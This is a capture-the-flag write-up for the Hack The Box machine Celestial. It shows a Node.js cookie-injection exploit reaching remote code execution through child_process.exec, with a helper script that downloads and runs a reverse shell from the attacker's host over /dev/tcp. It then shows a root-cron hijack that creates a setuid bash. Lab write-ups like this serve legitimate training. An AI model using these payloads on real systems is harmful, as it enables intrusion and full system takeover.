# Target
| Category          | Details                                                    |
|-------------------|------------------------------------------------------------|
| 📝 **Name**       | [Celestial](https://app.hackthebox.com/machines/Celestial) |  
| 🏷 **Type**       | HTB Machine                                                |
| 🖥 **OS**         | Linux                                                      |
| 🎯 **Difficulty** | Medium                                                     |
| 📁 **Tags**       | node.js, python                                            |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Celestial]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 17:06 +0100
Nmap scan report for 10.129.228.94
Host is up (0.026s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.84 seconds
```

#### Discover base64 encode `profile` cookie in web server response
```
┌──(magicrc㉿perun)-[~/attack/HTB Celestial]
└─$ curl -v http://$TARGET:3000                
*   Trying 10.129.228.94:3000...
* Connected to 10.129.228.94 (10.129.228.94) port 3000
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.129.228.94:3000
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< X-Powered-By: Express
< Set-Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age=900; Path=/; Expires=Thu, 19 Mar 2026 09:32:37 GMT; HttpOnly
< Content-Type: text/html; charset=utf-8
< Content-Length: 12
< ETag: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
< Date: Thu, 19 Mar 2026 09:17:37 GMT
< Connection: keep-alive
< 
* Connection #0 to host 10.129.228.94 left intact
<h1>404</h1> 
```

#### Decode `profile` cookie
```
┌──(magicrc㉿perun)-[~/attack/HTB Celestial]
└─$ curl -s -D - http://$TARGET:3000 -o /dev/null \
| grep -i '^Set-Cookie:' \
| grep -oP 'profile=\K[^;]+' \
| python3 -c "import sys,urllib.parse,base64; print(base64.b64decode(urllib.parse.unquote(sys.stdin.read().strip())).decode())"
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

#### Pass `profile` cookie back to server
```
┌──(magicrc㉿perun)-[~/attack/HTB Celestial]
└─$ curl http://$TARGET:3000 -H 'Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D'
Hey Dummy 2 + 2 is 22
```
We can see `2` and `22` in response, which might be related to `"num":"2"` passed in `profile` cookie.

#### Probe `num` for RCE
```
┌──(magicrc㉿perun)-[~/attack/HTB Celestial]
└─$ PROFILE=$(echo -n '{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"7*7;"}' | base64 -w 0 | jq -sRr @uri)
curl http://$TARGET:3000/ -H "Cookie: profile=$PROFILE"
Hey Dummy 7*7; + 7*7; is 49
```
It seems that `7*7;` has been evaluated as `49` which could prove RCE.

#### Prepare `cmd.sh` exploit
```
┌──(magicrc㉿perun)-[~/attack/HTB Celestial]
└─$ { cat <<'EOF'> cmd.sh
CMD="require('child_process').exec('${1}');"
echo $CMD
PROFILE=$(echo -n '{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"'${CMD}'"}' | base64 -w 0 | jq -sRr @uri)
curl http://$TARGET:3000/ -H "Cookie: profile=$PROFILE"
EOF
} && chmod +x cmd.sh
```

#### Create reverse shell script and host it over HTTP
```
┌──(magicrc㉿perun)-[~/attack/HTB Celestial]
└─$ echo "/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" > reverse_shell.sh && \
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Celestial]
└─$ nc -lvnp 4444              
listening on [any] 4444 ...
```

#### Spawn reverse shell connection 
```
┌──(magicrc㉿perun)-[~/attack/HTB Celestial]
└─$ ./cmd.sh "curl http://$LHOST/reverse_shell.sh -o /tmp/reverse_shell.sh" && \
./cmd.sh "chmod +x /tmp/reverse_shell.sh" && \
./cmd.sh "/tmp/reverse_shell.sh"
require('child_process').exec('curl http://10.10.14.16/reverse_shell.sh -o /tmp/reverse_shell.sh');
Hey Dummy require('child_process').exec('curl http://10.10.14.16/reverse_shell.sh -o /tmp/reverse_shell.sh'); + require('child_process').exec('curl http://10.10.14.16/reverse_shell.sh -o /tmp/reverse_shell.sh'); is [object Object]require('child_process').exec('chmod +x /tmp/reverse_shell.sh');
Hey Dummy require('child_process').exec('chmod +x /tmp/reverse_shell.sh'); + require('child_process').exec('chmod +x /tmp/reverse_shell.sh'); is [object Object]require('child_process').exec('/tmp/reverse_shell.sh');
Hey Dummy require('child_process').exec('/tmp/reverse_shell.sh'); + require('child_process').exec('/tmp/reverse_shell.sh'); is [object Object]
```

#### Confirm foothold gained
```
connect to [10.10.14.16] from (UNKNOWN) [10.129.228.94] 45612
bash: cannot set terminal process group (2873): Inappropriate ioctl for device
bash: no job control in this shell
sun@celestial:~$ id
uid=1000(sun) gid=1000(sun) groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

#### Capture user flag
```
sun@celestial:~$ cat /home/sun/user.txt
b6bccdd2aca38c527c4ea1dc6382434d
```

### Root flag

#### Discover `/home/sun/Documents/script.py` is being run by `root` user every 5 minutes
```
2026/03/19 04:40:01 CMD: UID=0     PID=9725   | python /home/sun/Documents/script.py 
<SNIP>
2026/03/19 04:45:01 CMD: UID=0     PID=9756   | python /home/sun/Documents/script.py
```

#### Check content and permissions of `/home/sun/Documents/script.py`
```
sun@celestial:~$ cat /home/sun/Documents/script.py && ls -la /home/sun/Documents/script.py
print "Script is running..."
-rw-rw-r-- 1 sun sun 29 Mar 18 12:05 /home/sun/Documents/script.py
```
With write permissions we could exploit this misconfiguration to spawn root shell.

#### Overwrite `/home/sun/Documents/script.py` with root shell spawner
```
sun@celestial:~$ cat <<'EOF'> /home/sun/Documents/script.py
import os
os.system("/bin/cp /bin/bash /tmp/root_shell; /bin/chmod +s /tmp/root_shell")
EOF
```

#### Wait for `/tmp/root_shell` to be created and use to escalate to `root` user
```
sun@celestial:~$ /tmp/root_shell -p
root_shell-4.3# id
uid=1000(sun) gid=1000(sun) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(sun)
```

#### Capture root flag
```
root_shell-4.3# cat /root/root.txt
eebfa7f4de60f06c43fc45997211a2aa
```
